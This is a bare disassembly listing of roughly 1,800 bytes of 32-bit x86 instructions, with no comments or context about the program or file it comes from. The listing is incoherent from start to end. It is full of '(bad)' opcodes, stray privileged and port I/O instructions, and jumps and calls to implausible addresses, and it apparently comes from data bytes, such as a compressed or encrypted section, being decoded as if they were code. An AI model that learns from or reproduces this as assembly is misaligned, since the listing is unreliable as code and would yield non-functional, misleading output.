  41ce9c:	push   esi
  41ce9d:	xchg   ebp,eax
  41ce9e:	inc    esp
  41ce9f:	leave  
  41cea0:	leave  
  41cea1:	or     edx,esi
  41cea3:	jbe    0x41cee0
  41cea5:	push   eax
  41cea6:	scas   eax,DWORD PTR es:[edi]
  41cea7:	test   BYTE PTR [ebx-0x723d9b27],0xdc
  41ceae:	cmp    esi,DWORD PTR [ecx-0x5c]
  41ceb1:	or     DWORD PTR [edx],esp
  41ceb3:	mov    al,0xe0
  41ceb5:	xor    eax,0xb1a19471
  41cebb:	push   ecx
  41cebc:	and    edi,eax
  41cebe:	mov    eax,ds:0x6c92e225
  41cec3:	aas    
  41cec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cec5:	xor    edx,0xffffff81
  41cec8:	inc    ebp
  41cec9:	not    DWORD PTR [eax+ecx*2+0x12]
  41cecd:	push   edx
  41cece:	mov    edi,0x79a7f4e0
  41ced3:	retf   
  41ced4:	push   0x29cebba9
  41ced9:	push   esi
  41ceda:	and    DWORD PTR [edi-0x7a],0x2a
  41cede:	mov    bh,0x6
  41cee0:	lock js 0x41cf20
  41cee3:	xchg   edi,eax
  41cee4:	jb     0x41ce9c
  41cee6:	stc    
  41cee7:	lods   eax,DWORD PTR ds:[esi]
  41cee8:	and    esi,0xffffffab
  41ceeb:	pop    ebp
  41ceec:	sub    bl,ch
  41ceee:	or     al,0xd4
  41cef0:	pop    esp
  41cef1:	pop    ecx
  41cef2:	outs   dx,BYTE PTR ds:[esi]
  41cef3:	scas   eax,DWORD PTR es:[edi]
  41cef4:	push   ds
  41cef5:	mov    WORD PTR [ebx-0x11],gs
  41cef8:	jae    0x41ce7a
  41cefa:	pop    ss
  41cefb:	xor    al,0x63
  41cefd:	push   ds
  41cefe:	ins    BYTE PTR es:[edi],dx
  41ceff:	add    edx,DWORD PTR [edi-0x2c1b2b36]
  41cf05:	in     eax,0x97
  41cf07:	dec    ebp
  41cf08:	cmp    esi,DWORD PTR [edi-0x8ea0d86]
  41cf0e:	xchg   BYTE PTR [edx-0x41],ch
  41cf11:	nop
  41cf12:	push   ebp
  41cf13:	pop    ebp
  41cf14:	sbb    al,BYTE PTR [edi-0x68515d4b]
  41cf1a:	mov    edi,0x6edbbfd0
  41cf1f:	addr16 xchg ecx,eax
  41cf21:	dec    ecx
  41cf22:	or     al,0x3d
  41cf24:	shr    DWORD PTR [eax-0x1ad7b701],0xb
  41cf2b:	pop    ebx
  41cf2c:	(bad)  
  41cf2d:	aas    
  41cf2e:	mov    ds:0x5b42cf5,al
  41cf33:	xor    al,cl
  41cf35:	xchg   BYTE PTR [ebx],ch
  41cf37:	icebp  
  41cf38:	mov    DWORD PTR [eax+edi*4+0x7df7aeb9],edi
  41cf3f:	push   cs
  41cf40:	aam    0x9b
  41cf42:	sub    dh,0x82
  41cf45:	dec    ebx
  41cf46:	push   eax
  41cf47:	inc    eax
  41cf48:	inc    edi
  41cf49:	and    al,0xfd
  41cf4b:	retf   0x64aa
  41cf4e:	pop    ebp
  41cf4f:	or     ch,ah
  41cf51:	outs   dx,DWORD PTR ds:[esi]
  41cf52:	adc    eax,DWORD PTR [edx+edi*8+0x61]
  41cf56:	scas   al,BYTE PTR es:[edi]
  41cf57:	mov    dh,0xe2
  41cf59:	data16 daa 
  41cf5b:	push   esp
  41cf5c:	daa    
  41cf5d:	cmp    eax,0x1405989b
  41cf62:	add    DWORD PTR [edx-0x79],esp
  41cf65:	sbb    eax,0x4df3d083
  41cf6a:	fs mov ebp,0xc815eb7f
  41cf70:	inc    esp
  41cf71:	cmp    ebx,DWORD PTR [esi-0x128ac24a]
  41cf77:	mov    esp,0x857e85c1
  41cf7c:	jmp    DWORD PTR [edi+0x19]
  41cf7f:	cmc    
  41cf80:	std    
  41cf81:	inc    edi
  41cf82:	emms   
  41cf84:	add    esp,edx
  41cf86:	(bad)  
  41cf87:	xchg   esi,eax
  41cf88:	inc    edx
  41cf89:	add    al,BYTE PTR [esi-0x34]
  41cf8c:	push   esp
  41cf8d:	and    bl,ah
  41cf8f:	retf   
  41cf90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf91:	sti    
  41cf92:	push   ebx
  41cf93:	cmp    eax,0xea9224a0
  41cf98:	or     ebx,DWORD PTR [ebx-0x1714cc0e]
  41cf9e:	push   cs
  41cf9f:	lods   eax,DWORD PTR ds:[esi]
  41cfa0:	cmp    BYTE PTR [edx+eiz*2],0xa2
  41cfa4:	out    dx,eax
  41cfa5:	sahf   
  41cfa6:	xchg   esp,eax
  41cfa7:	dec    esp
  41cfa8:	dec    esp
  41cfa9:	pop    es
  41cfaa:	mov    ebx,0x5a671542
  41cfaf:	add    DWORD PTR [edi-0x2be6cd10],ebx
  41cfb5:	scas   al,BYTE PTR es:[edi]
  41cfb6:	ss stos BYTE PTR es:[edi],al
  41cfb8:	loope  0x41cfdf
  41cfba:	popf   
  41cfbb:	xchg   esi,eax
  41cfbc:	in     al,dx
  41cfbd:	mov    al,0x1
  41cfbf:	xchg   edi,eax
  41cfc0:	jnp    0x41d007
  41cfc2:	dec    esi
  41cfc3:	and    al,0x2f
  41cfc5:	pop    ds
  41cfc6:	dec    edi
  41cfc7:	jae    0x41cf99
  41cfc9:	sti    
  41cfca:	mov    ebp,0x27b638a2
  41cfcf:	push   esp
  41cfd0:	mov    dh,0x5e
  41cfd2:	xor    DWORD PTR [ebx-0x79],ebp
  41cfd5:	pop    ebp
  41cfd6:	fstp   DWORD PTR [ebp+0x3814ae93]
  41cfdc:	jmp    0x41d03c
  41cfde:	cmp    eax,0x9819fc36
  41cfe3:	jg     0x41cfb4
  41cfe5:	cmp    dh,al
  41cfe7:	in     al,0x92
  41cfe9:	push   ds
  41cfea:	push   ebp
  41cfeb:	xor    dl,BYTE PTR [esi]
  41cfed:	push   ds
  41cfee:	mov    al,ds:0x2ca7f7c8
  41cff3:	jnp    0x41d01e
  41cff5:	xor    BYTE PTR [edx-0x17],bl
  41cff8:	mov    eax,0xf721bf38
  41cffd:	in     eax,dx
  41cffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfff:	sbb    edi,DWORD PTR [esi-0x2e]
  41d002:	imul   ecx,DWORD PTR [esi+0x63],0x7d
  41d006:	lods   al,BYTE PTR ds:[esi]
  41d007:	push   ss
  41d008:	repnz (bad) 
  41d00a:	int    0x2d
  41d00c:	sub    al,0xb5
  41d00e:	pop    ebp
  41d00f:	push   0x8dc64ecb
  41d014:	jae    0x41d068
  41d016:	mov    ecx,0x81589231
  41d01b:	ret    
  41d01c:	mov    ds:0x451e2034,eax
  41d021:	pop    ebp
  41d022:	xchg   esp,eax
  41d023:	bound  esi,QWORD PTR [ecx-0x127030d4]
  41d029:	and    esp,DWORD PTR [ebx+ebx*4]
  41d02c:	test   DWORD PTR [esi-0x491153b1],edi
  41d032:	call   0x4d24ff8c
  41d037:	or     al,0xab
  41d039:	rol    DWORD PTR [edx+edi*4],1
  41d03c:	hlt    
  41d03d:	xchg   ebp,eax
  41d03e:	(bad)  
  41d03f:	mov    ah,0x64
  41d041:	das    
  41d042:	push   0x782d20b3
  41d047:	out    0x90,al
  41d049:	dec    edx
  41d04a:	mov    ds:0x8808d2c0,eax
  41d04f:	mov    ch,BYTE PTR [ecx+ebx*1+0x6f595bdd]
  41d056:	mov    eax,ebp
  41d058:	gs test al,0xf6
  41d05b:	xlat   BYTE PTR ds:[ebx]
  41d05c:	inc    ecx
  41d05d:	pop    ebx
  41d05e:	mov    BYTE PTR [ebp-0x6f],cl
  41d061:	mov    DWORD PTR [ebx-0x38],esi
  41d064:	aad    0x46
  41d066:	pop    ss
  41d067:	inc    esi
  41d068:	jge    0x41d05e
  41d06a:	and    BYTE PTR [esi],dh
  41d06c:	les    edi,FWORD PTR [ebx]
  41d06e:	add    al,0xc0
  41d070:	lock and ch,BYTE PTR [esi]
  41d073:	mov    cl,dl
  41d075:	and    BYTE PTR [eax+0x49836faf],dl
  41d07b:	(bad)
  41d07f:	into   
  41d080:	jmp    0x1d48:0xa90c9c9c
  41d087:	or     al,0x40
  41d089:	fstp   st(3)
  41d08b:	adc    dl,BYTE PTR [esi-0x6ed659a9]
  41d091:	lods   eax,DWORD PTR ds:[esi]
  41d092:	loopne 0x41d084
  41d094:	push   esp
  41d095:	out    dx,al
  41d096:	xor    edx,esp
  41d098:	pop    ds
  41d099:	aam    0x5e
  41d09b:	jo     0x41d077
  41d09d:	dec    ecx
  41d09e:	frstor [edi-0x6]
  41d0a1:	fidiv  WORD PTR [eax+edx*8-0x4868862a]
  41d0a8:	ins    DWORD PTR es:[edi],dx
  41d0a9:	rol    DWORD PTR [edi-0x1b],1
  41d0ac:	aad    0xd
  41d0ae:	push   cs
  41d0af:	mov    edx,0x50477eeb
  41d0b4:	inc    DWORD PTR [ebx]
  41d0b6:	outs   dx,BYTE PTR ds:[esi]
  41d0b7:	xchg   esi,eax
  41d0b8:	clc    
  41d0b9:	dec    edi
  41d0ba:	mov    ah,0x1a
  41d0bc:	xchg   ebx,eax
  41d0bd:	ffreep st(3)
  41d0bf:	sub    eax,0xeff6bf
  41d0c4:	retf   
  41d0c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0c6:	sbb    DWORD PTR ds:0x42eed93b,ebx
  41d0cc:	adc    DWORD PTR [edi+ebx*8],ebp
  41d0cf:	or     al,0xb6
  41d0d1:	or     edx,edx
  41d0d3:	dec    edi
  41d0d4:	push   ebx
  41d0d5:	outs   dx,DWORD PTR ds:[esi]
  41d0d6:	cli    
  41d0d7:	inc    esp
  41d0d8:	outs   dx,DWORD PTR ds:[esi]
  41d0d9:	icebp  
  41d0da:	mov    ds:0x584dc455,al
  41d0df:	pop    ebx
  41d0e0:	cmp    al,0x3
  41d0e2:	fcmovne st,st(7)
  41d0e4:	test   eax,0xc648c99a
  41d0e9:	je     0x41d104
  41d0eb:	cli    
  41d0ec:	jle    0x41d0cd
  41d0ee:	sbb    eax,0x522929a5
  41d0f3:	fst    DWORD PTR [eax+0xd]
  41d0f6:	ret    0x4033
  41d0f9:	mov    ebx,esp
  41d0fb:	mov    edi,0xb8b3eecc
  41d100:	loop   0x41d0f6
  41d102:	pop    eax
  41d103:	push   edi
  41d104:	daa    
  41d105:	xor    DWORD PTR [eax+0x3c],0x75
  41d109:	popa   
  41d10a:	inc    ecx
  41d10b:	(bad)  
  41d10d:	aaa    
  41d10e:	inc    ecx
  41d10f:	xchg   ecx,eax
  41d110:	ins    BYTE PTR es:[edi],dx
  41d111:	fwait
  41d112:	vmwrite esi,DWORD PTR [edx+0x21]
  41d116:	rol    BYTE PTR [esi-0x606a076b],1
  41d11c:	pusha  
  41d11d:	das    
  41d11e:	mov    ebx,0x6ad13c0d
  41d123:	push   edi
  41d124:	scas   al,BYTE PTR es:[edi]
  41d125:	adc    ah,ah
  41d127:	(bad)  
  41d128:	push   0xe60a2d17
  41d12d:	imul   ebx,DWORD PTR [ebx-0x1917a1f1],0xffffff97
  41d134:	or     bh,BYTE PTR [edi]
  41d136:	adc    dh,bl
  41d138:	and    BYTE PTR [ebx],0xc2
  41d13b:	add    ebx,DWORD PTR [eax]
  41d13d:	add    ebx,ebx
  41d13f:	nop
  41d140:	pop    DWORD PTR [esp+ebx*8-0x5a]
  41d144:	mov    dh,0x49
  41d146:	jne    0x41d181
  41d148:	sub    BYTE PTR [edx],0xd5
  41d14b:	outs   dx,DWORD PTR ds:[esi]
  41d14c:	xchg   BYTE PTR [eax-0x2b577911],cl
  41d152:	jns    0x41d17e
  41d154:	cld    
  41d155:	cdq    
  41d156:	int3   
  41d157:	fisttp QWORD PTR [edi-0x50]
  41d15a:	jo     0x41d19b
  41d15c:	retf   
  41d15d:	mov    ?,WORD PTR [edx+esi*8+0xb]
  41d161:	pusha  
  41d162:	out    0x82,al
  41d164:	fsubr  QWORD PTR [edx-0x1a8e464e]
  41d16a:	and    ah,cl
  41d16c:	add    DWORD PTR [esp+ebx*8-0x16],esp
  41d170:	mov    DWORD PTR [esi-0x609242a2],ebp
  41d176:	ins    BYTE PTR es:[edi],dx
  41d177:	jnp    0x41d154
  41d179:	dec    ebx
  41d17a:	jg     0x41d16c
  41d17c:	shl    BYTE PTR cs:[edi+0x7c],1
  41d180:	mov    eax,ds:0xb682d0bc
  41d185:	mov    al,ds:0x853ef374
  41d18a:	lea    edi,[ebx+0x50]
  41d18d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d18e:	xchg   eax,edx
  41d190:	sub    BYTE PTR [edx+0x55],bh
  41d193:	push   esp
  41d194:	ret    0x4a2d
  41d197:	stos   BYTE PTR es:[edi],al
  41d198:	jge    0x41d1c9
  41d19a:	int3   
  41d19b:	mov    eax,0xaa2dced2
  41d1a0:	ror    DWORD PTR [edx+0x38],0x2e
  41d1a4:	std    
  41d1a5:	inc    edi
  41d1a6:	xchg   BYTE PTR [ecx-0x2466f078],dl
  41d1ac:	cli    
  41d1ad:	inc    ecx
  41d1ae:	xor    DWORD PTR [esi],ebx
  41d1b0:	mov    bl,0x71
  41d1b2:	sbb    BYTE PTR ds:0xae0b731e,dh
  41d1b8:	or     edx,DWORD PTR [eax-0x7c]
  41d1bb:	rcl    dh,cl
  41d1bd:	push   ebp
  41d1be:	and    edi,DWORD PTR ds:0xb31b9e30
  41d1c4:	ja     0x41d1ea
  41d1c6:	xchg   BYTE PTR [ebx+0x49],dl
  41d1c9:	or     ebp,DWORD PTR [ebp+0x0]
  41d1cc:	push   ebx
  41d1cd:	call   0x681b4099
  41d1d2:	inc    DWORD PTR [ebx]
  41d1d4:	dec    esi
  41d1d5:	retf   0x376d
  41d1d8:	inc    edi
  41d1d9:	ins    BYTE PTR es:[edi],dx
  41d1da:	(bad)  
  41d1db:	push   edi
  41d1dc:	mov    ebp,0xe98f4790
  41d1e1:	and    eax,0x6d4034db
  41d1e6:	ins    DWORD PTR es:[edi],dx
  41d1e7:	mov    ?,edx
  41d1e9:	inc    eax
  41d1ea:	daa    
  41d1eb:	sbb    al,0x6e
  41d1ed:	cmp    DWORD PTR [eax],esi
  41d1ef:	cmp    eax,0x5506e2e5
  41d1f4:	xchg   ecx,eax
  41d1f5:	mov    WORD PTR [eax-0x5c9689a7],ds
  41d1fb:	repz jo 0x41d213
  41d1fe:	or     BYTE PTR [ebx],ah
  41d200:	shr    DWORD PTR [esi],cl
  41d202:	push   es
  41d203:	cmp    edi,DWORD PTR [eax]
  41d205:	repnz adc eax,0x54f61d7d
  41d20b:	xchg   ebx,eax
  41d20c:	retf   
  41d20d:	dec    edx
  41d20e:	es sti 
  41d210:	push   eax
  41d211:	repnz dec ebx
  41d213:	xor    ch,BYTE PTR [eax+0x3555b588]
  41d219:	mov    ds:0xc694dec5,al
  41d21e:	mov    ah,0x2c
  41d220:	iret   
  41d221:	add    edi,ebp
  41d223:	test   eax,0x1a182dab
  41d228:	xchg   esp,eax
  41d229:	out    dx,eax
  41d22a:	mov    ch,0x17
  41d22c:	retf   
  41d22d:	popa   
  41d22e:	xor    dh,BYTE PTR [eax]
  41d230:	pop    esp
  41d231:	in     eax,0x30
  41d233:	les    edi,FWORD PTR [esi+0x327e1ff4]
  41d239:	mov    ds:0xb21cc258,al
  41d23e:	out    dx,eax
  41d23f:	int    0xd
  41d241:	add    DWORD PTR [ebp-0x32166bfd],ecx
  41d247:	popa   
  41d248:	lahf   
  41d249:	addr16 mov cs,ebx
  41d24c:	retf   0xab4a
  41d24f:	jo     0x41d229
  41d251:	iret   
  41d252:	imul   esp,DWORD PTR [esi+0x37944ffc],0xffffffcc
  41d259:	mov    ds:0x859384fa,eax
  41d25e:	fcomp  QWORD PTR [edi+0x34]
  41d261:	jbe    0x41d212
  41d263:	js     0x41d236
  41d265:	mov    ecx,0x36950eaf
  41d26a:	nop
  41d26b:	or     bl,dl
  41d26d:	ret    
  41d26e:	xor    DWORD PTR [ebx+0x726f6528],0x70
  41d275:	test   BYTE PTR [edx+0x12d6d065],0xdb
  41d27c:	mov    dl,0xdc
  41d27e:	sub    DWORD PTR [esi+esi*8],ecx
  41d281:	jmp    0x41d2e7
  41d283:	enter  0xfc70,0x9f
  41d287:	sbb    cl,cl
  41d289:	fadd   DWORD PTR ds:0xed673a76
  41d28f:	lock mov BYTE PTR [ecx+ebx*8+0x10],bh
  41d294:	iret   
  41d295:	push   cs
  41d296:	jg     0x41d2aa
  41d298:	je     0x41d2a6
  41d29a:	mov    ecx,0xe705b8db
  41d29f:	xor    eax,DWORD PTR [edx]
  41d2a1:	jmp    0xbaf242e6
  41d2a6:	pop    edx
  41d2a7:	jns    0x41d296
  41d2a9:	pop    edi
  41d2aa:	fcom   DWORD PTR [esi-0x34]
  41d2ad:	xor    al,BYTE PTR [edi]
  41d2af:	not    DWORD PTR [ebx]
  41d2b1:	mov    edx,0x1cd8f226
  41d2b6:	and    eax,0xc3655093
  41d2bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2bc:	mov    bl,0x7c
  41d2be:	sbb    al,0x36
  41d2c0:	in     eax,dx
  41d2c1:	jno    0x41d24c
  41d2c3:	(bad)  
  41d2c4:	jge    0x41d2a8
  41d2c6:	add    al,0x4e
  41d2c8:	fdiv   QWORD PTR [esi-0xf94b91b]
  41d2ce:	fimul  WORD PTR [eax-0x4eb8b17d]
  41d2d4:	xchg   ecx,eax
  41d2d5:	mov    dh,0xa2
  41d2d7:	lahf   
  41d2d8:	fcomp  DWORD PTR [edi+0x11]
  41d2db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2dc:	sub    ecx,0xffffff97
  41d2df:	mov    bl,0xa
  41d2e1:	adc    edi,DWORD PTR [eax+0xe]
  41d2e4:	inc    eax
  41d2e5:	or     bh,BYTE PTR [edx]
  41d2e7:	sub    ecx,DWORD PTR [ebx+ebx*4]
  41d2ea:	inc    ebp
  41d2eb:	fwait
  41d2ec:	dec    ebp
  41d2ed:	ins    BYTE PTR es:[edi],dx
  41d2ee:	sbb    eax,0x4ca7a924
  41d2f3:	pop    esp
  41d2f4:	repz push 0xffffffc7
  41d2f7:	call   0x11cc99c0
  41d2fc:	and    BYTE PTR [ebx+0x72e63903],bl
  41d302:	addr16 mov ebx,0x1b75052d
  41d308:	aam    0x9a
  41d30a:	push   ecx
  41d30b:	pop    esp
  41d30c:	imul   ebp,DWORD PTR [edi+0x6d8180bf],0x1b
  41d313:	cld    
  41d314:	addr16 mov ecx,0x1cccf7de
  41d31a:	stos   DWORD PTR es:[edi],eax
  41d31b:	lds    ebx,FWORD PTR gs:[edx+0x54fcf33e]
  41d322:	iret   
  41d323:	adc    ecx,DWORD PTR [eax+ebp*2+0x2e5d329]
  41d32a:	icebp  
  41d32b:	rcr    BYTE PTR [eax],cl
  41d32d:	sahf   
  41d32e:	push   ds
  41d32f:	jp     0x41d337
  41d331:	xor    eax,0xfe8fc46f
  41d336:	out    dx,al
  41d337:	add    BYTE PTR [eax+0x1ef2392c],bh
  41d33d:	dec    ebx
  41d33e:	ds int3 
  41d340:	std    
  41d341:	sbb    BYTE PTR [eax+edx*1],dh
  41d344:	jp     0x41d37d
  41d346:	shl    ecx,cl
  41d348:	das    
  41d349:	test   al,0x6c
  41d34b:	pusha  
  41d34c:	adc    al,0x3c
  41d34e:	add    BYTE PTR [ebp+0x52a86829],cl
  41d354:	mov    ecx,0x3fce29f
  41d359:	pop    ds
  41d35a:	mov    cl,0xc9
  41d35c:	(bad)  
  41d35d:	and    edx,DWORD PTR [edx-0x1b7af1ff]
  41d363:	loope  0x41d341
  41d365:	nop
  41d366:	mov    eax,ds:0xd149cd1b
  41d36b:	cli    
  41d36c:	leave  
  41d36d:	(bad)  [edi-0x5f]
  41d370:	call   0xbe11a6b8
  41d375:	lock (bad) 
  41d378:	mov    ch,0x1a
  41d37a:	mov    al,ds:0x34e92a6d
  41d37f:	or     al,0xcc
  41d381:	fbstp  TBYTE PTR [esi+0x3d9c921e]
  41d387:	std    
  41d388:	add    eax,0x1266e450
  41d38d:	or     eax,0xc30063bc
  41d392:	jno    0x41d3a3
  41d394:	xlat   BYTE PTR ds:[ebx]
  41d395:	adc    eax,0xed36e971
  41d39a:	jb     0x41d358
  41d39c:	or     BYTE PTR [ecx],al
  41d39e:	inc    esp
  41d39f:	mov    ah,0x47
  41d3a1:	dec    edi
  41d3a2:	jmp    0x519444a1
  41d3a7:	sub    cl,cl
  41d3a9:	and    edi,DWORD PTR [edi]
  41d3ab:	into   
  41d3ac:	dec    ebp
  41d3ad:	shr    BYTE PTR [eax+0x78],0x2e
  41d3b1:	cmp    eax,0xe0f86690
  41d3b6:	retf   0x3adc
  41d3b9:	jle    0x41d396
  41d3bb:	shl    DWORD PTR [edx-0x122c7a92],1
  41d3c1:	jb     0x41d3c9
  41d3c3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41d3c5:	aas    
  41d3c6:	jg     0x41d3ca
  41d3c8:	std    
  41d3c9:	pop    ss
  41d3ca:	dec    edi
  41d3cb:	and    al,0xd2
  41d3cd:	push   ds
  41d3ce:	das    
  41d3cf:	ret    
  41d3d0:	sbb    DWORD PTR [ebx],esp
  41d3d2:	xor    eax,0x8a37f4ed
  41d3d7:	mov    esp,0xf6133a53
  41d3dc:	fstp   QWORD PTR [ebx+0x2092313f]
  41d3e2:	cs xchg ebp,eax
  41d3e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3e5:	test   BYTE PTR [edx-0x59d6d05e],0x71
  41d3ec:	push   eax
  41d3ed:	repz dec esi
  41d3ef:	xor    eax,0xd2626d4
  41d3f4:	data16 fild WORD PTR [ecx+0x502f8b2c]
  41d3fb:	jo     0x41d445
  41d3fd:	test   eax,0x2bd0ce07
  41d402:	sub    al,0x12
  41d404:	shl    ebp,1
  41d406:	adc    ah,ah
  41d408:	out    dx,eax
  41d409:	and    BYTE PTR [edi+0x8196ca8],ah
  41d40f:	xor    dh,BYTE PTR ss:[edx]
  41d412:	ins    BYTE PTR es:[edi],dx
  41d413:	pop    edi
  41d414:	and    eax,0x489e1684
  41d419:	je     0x41d421
  41d41b:	push   es
  41d41c:	in     al,0xfd
  41d41e:	pop    eax
  41d41f:	dec    eax
  41d420:	dec    ecx
  41d421:	jae    0x41d4a1
  41d423:	pop    edx
  41d424:	pop    edi
  41d425:	pop    edi
  41d426:	cmp    ch,BYTE PTR [eax+ecx*8]
  41d429:	(bad)  
  41d42a:	inc    eax
  41d42b:	dec    ecx
  41d42c:	dec    eax
  41d42d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d42e:	mov    esi,0x11e4d927
  41d433:	or     al,0xcd
  41d435:	mov    ebp,0x260bae1b
  41d43a:	xchg   edx,eax
  41d43b:	(bad)  
  41d43c:	fwait
  41d43d:	les    edi,FWORD PTR [edi]
  41d43f:	shl    al,1
  41d441:	xchg   edx,eax
  41d442:	rol    BYTE PTR [ecx-0x53],0xae
  41d446:	dec    esi
  41d447:	sar    BYTE PTR [ebx],1
  41d449:	cwde   
  41d44a:	test   DWORD PTR [ecx+0x75],ebx
  41d44d:	fidivr WORD PTR [esi]
  41d44f:	mov    edx,0x296ba6d
  41d454:	inc    ebp
  41d455:	xchg   DWORD PTR [ecx+0x39],ebp
  41d458:	repnz inc ecx
  41d45a:	jb     0x41d3f8
  41d45c:	sbb    bh,ah
  41d45e:	sbb    eax,DWORD PTR [esi]
  41d460:	imul   edx,DWORD PTR [esi-0x42],0xf3a17330
  41d467:	ret    
  41d468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d469:	sbb    al,0x37
  41d46b:	lods   al,BYTE PTR ds:[esi]
  41d46c:	pop    ds
  41d46d:	and    DWORD PTR [ebx+0xd],ebx
  41d470:	sbb    ah,dl
  41d472:	jns    0x41d4b5
  41d474:	clc    
  41d475:	dec    esp
  41d476:	mov    dl,0x9d
  41d478:	test   DWORD PTR [ecx-0x581ba0a6],ebp
  41d47e:	mov    ebx,0x1081f24
  41d483:	(bad)  
  41d484:	pop    edi
  41d485:	test   DWORD PTR [ebx+ebx*1-0x6c],0xdd953c91
  41d48d:	punpckldq mm5,DWORD PTR [ecx+ebp*8-0x77]
  41d492:	push   ecx
  41d493:	dec    edi
  41d494:	cmp    cl,BYTE PTR [esi+0x2a6af714]
  41d49a:	pop    DWORD PTR gs:[esi-0x29]
  41d49e:	sub    eax,0x6c5a5499
  41d4a3:	xor    BYTE PTR [edi-0x36],ch
  41d4a6:	sub    ebp,DWORD PTR [esi]
  41d4a8:	mov    edx,0xb695e6cd
  41d4ad:	inc    ebx
  41d4ae:	loope  0x41d4ba
  41d4b0:	jns    0x41d4e6
  41d4b2:	dec    esi
  41d4b3:	mov    eax,0xef942539
  41d4b8:	out    dx,eax
  41d4b9:	cmp    BYTE PTR [edx-0x6e0e6c44],ah
  41d4bf:	xlat   BYTE PTR ds:[ebx]
  41d4c0:	int    0xe4
  41d4c2:	call   0xb920:0xe7625092
  41d4c9:	in     eax,0xf5
  41d4cb:	adc    al,0xf6
  41d4cd:	jmp    0x41d459
  41d4cf:	mov    ebx,DWORD PTR [ebp-0x697cbb5b]
  41d4d5:	inc    ebp
  41d4d6:	mov    ch,0x41
  41d4d8:	int    0xf
  41d4da:	push   es
  41d4db:	add    bl,BYTE PTR [edx+eax*4]
  41d4de:	and    eax,0x26f7b02b
  41d4e3:	mov    ah,0x71
  41d4e5:	jle    0x41d4a2
  41d4e7:	push   ds
  41d4e8:	in     eax,0x93
  41d4ea:	sbb    al,0x3
  41d4ec:	push   edi
  41d4ed:	scas   eax,DWORD PTR es:[edi]
  41d4ee:	mov    ah,0x64
  41d4f0:	mov    DWORD PTR [ebx],ebp
  41d4f2:	out    dx,eax
  41d4f3:	rcl    BYTE PTR [ebp+0x2beda81f],cl
  41d4f9:	mov    DWORD PTR [ebp-0x72],ebp
  41d4fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4fd:	int3   
  41d4fe:	pusha  
  41d4ff:	fidiv  DWORD PTR [ecx-0x6ca90b3]
  41d505:	popf   
  41d506:	sbb    al,0x5e
  41d508:	fstp   TBYTE PTR [edx]
  41d50a:	cvtps2pi mm6,QWORD PTR [esi+0x44fcf639]
  41d511:	mov    WORD PTR [esi],cs
  41d513:	push   DWORD PTR [edi-0x59]
  41d516:	popf   
  41d517:	div    BYTE PTR [esi-0x7b]
  41d51a:	jmp    0x41d4e0
  41d51c:	dec    DWORD PTR [ebx+0x40]
  41d51f:	xchg   esi,eax
  41d520:	cli    
  41d521:	sahf   
  41d522:	mov    ecx,0x2f98f5d4
  41d527:	icebp  
  41d528:	test   BYTE PTR [ecx],0xb8
  41d52b:	aam    0x59
  41d52d:	mov    dl,0xf8
  41d52f:	push   0xffffffaf
  41d531:	push   0x74
  41d533:	or     al,0xc7
  41d535:	out    0x83,eax
  41d537:	int3   
  41d538:	sbb    cl,BYTE PTR [esi]
  41d53a:	outs   dx,DWORD PTR ds:[esi]
  41d53b:	or     BYTE PTR [ebp-0x62],bh
  41d53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d53f:	dec    edi
  41d540:	sbb    al,0xc5
  41d542:	dec    esi
  41d543:	or     eax,0x471501f9
  41d548:	(bad)  
  41d549:	stos   DWORD PTR es:[edi],eax
  41d54a:	rcl    BYTE PTR [ebp+edx*4-0x6a9f6cc5],cl
  41d551:	ss ins DWORD PTR es:[edi],dx
  41d553:	mov    edx,0xf1d1d0ae
  41d558:	push   0x40
  41d55a:	es (bad) 
  41d55d:	scas   al,BYTE PTR es:[edi]
  41d55e:	mov    edi,0xd034ef78
  41d563:	(bad)  
  41d564:	enter  0x82f6,0xd7
  41d568:	loopne 0x41d596
  41d56a:	jo     0x41d5bb
  41d56c:	and    BYTE PTR [edx-0x73],0x9d
  41d570:	jne    0x41d511
  41d572:	out    dx,al
  41d573:	sub    edi,DWORD PTR [ecx-0x4c]
  41d576:	jbe    0x41d57a
  41d578:	test   DWORD PTR [ecx],edi
  41d57a:	mov    edx,0x20f83eed
  41d57f:	and    ecx,esi
  41d581:	xchg   al,dh
  41d583:	das    
  41d584:	pop    ss
  41d585:	cwde   
  41d586:	gs stos DWORD PTR es:[edi],eax
  41d588:	jle    0x41d528
  41d58a:	xchg   BYTE PTR [esi+eax*1],ch
  41d58d:	sub    DWORD PTR [eax+0x40],esi
  41d590:	add    al,al
  41d592:	mov    eax,ds:0x86cd5be
  41d597:	cmp    DWORD PTR [eax+0x4ffea59],ebp
  41d59d:	xchg   esp,eax
  41d59e:	retf   
  41d59f:	rcr    edi,1
  41d5a1:	aas    
  41d5a2:	xor    ebp,DWORD PTR [edx+ebx*4]
  41d5a5:	(bad)  
  41d5a6:	in     eax,dx
  41d5a7:	jge    0x41d531
  41d5a9:	imul   edx,DWORD PTR [esi-0x3e],0x71
  41d5ad:	or     edx,DWORD PTR [edx]
  41d5af:	mov    esi,0x669e508b
  41d5b4:	bound  ebx,QWORD PTR [ecx]
  41d5b6:	pop    ebp
  41d5b7:	xor    BYTE PTR [eax+0x73941ed3],cl
  41d5bd:	fild   QWORD PTR [edx-0x3f7bce48]
  41d5c3:	push   esp
  41d5c4:	mov    al,0xab
  41d5c6:	shl    DWORD PTR [eax-0x7b],cl
  41d5c9:	adc    ah,ch
  41d5cb:	das    
  41d5cc:	cmp    BYTE PTR [ebx],dh
  41d5ce:	js     0x41d5c0
  41d5d0:	mov    ebp,0xc4746939
  41d5d5:	xor    al,0x3e
  41d5d7:	mov    ebp,0xe5e700f5
  41d5dc:	push   0x3e979123
  41d5e1:	jns    0x41d5cc
  41d5e3:	aam    0x59
  41d5e5:	cs xchg ebp,eax
